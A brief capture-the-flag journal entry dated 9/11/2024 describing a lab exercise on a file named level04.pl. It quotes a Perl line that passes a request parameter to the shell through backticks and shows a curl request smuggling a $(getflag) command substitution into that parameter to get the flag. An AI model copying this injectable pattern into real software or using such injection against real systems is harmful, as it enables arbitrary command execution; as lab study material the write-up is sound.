Date: 9/11/2024

Entry:

Today's task was to analyze the file `./level04.pl`.

After analyzing the file, we discovered that the page's code contains a line that prints the parameter sent in the request to it:

```perl
  print `echo $y 2>&1`;
```
Using a simple OS injection:

```bash
curl localhost:4747?x="$(getflag)"
```
we were able to obtain the flag.
